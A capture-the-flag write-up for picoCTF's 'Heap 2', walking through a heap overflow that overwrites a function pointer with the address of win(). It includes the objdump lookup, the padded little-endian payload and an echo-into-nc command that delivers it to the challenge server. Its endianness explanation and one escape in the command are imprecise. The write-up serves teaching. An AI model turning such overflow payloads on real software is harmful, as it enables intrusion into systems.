# Heap 2

This challenge is the same as heap 1, however, the win function has changed:

```
void check_win() { ((void (*)())*(int*)x)(); }
```

Without going into too much detail, this will call the function which memory address is x.
So, first we have to figure out where win is located in the binary. This is easily done by running:
`objdump -d chall | grep "win"`

which will give us the output: `00000000004011a0 <win>:`

This means that the entrypoint for win() is in `00000000004011a0`, however, this is printed as big endian, whereas our system is little endian, meaning we have to swap the endianness: `a011400000000000`. 

We then have to construct our string payload. We know from the previous heap challenges that we need `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH` infront to write into `safe_val`. 

Lastly, we have to remember to encode the address into hex. Putting all of this together gives us the payload: `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xa0\x11\x40\x00\x00\x00\x00\x00`

Putting this in directly to the program however did not work, meaning that we need to encode it properly. This can be done in many ways but using echo and piping into nc is the easiest.

This gives us the command: `echo -e -n "2\nAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xa0\x11\x40\x00\x00\x00\x00\x00\n3\n\4\n" | nc ip.picoctf.net port`

-e for enable interpretation of backslash escapes and -n for do not output the trailing newline.

This provides us with the flag.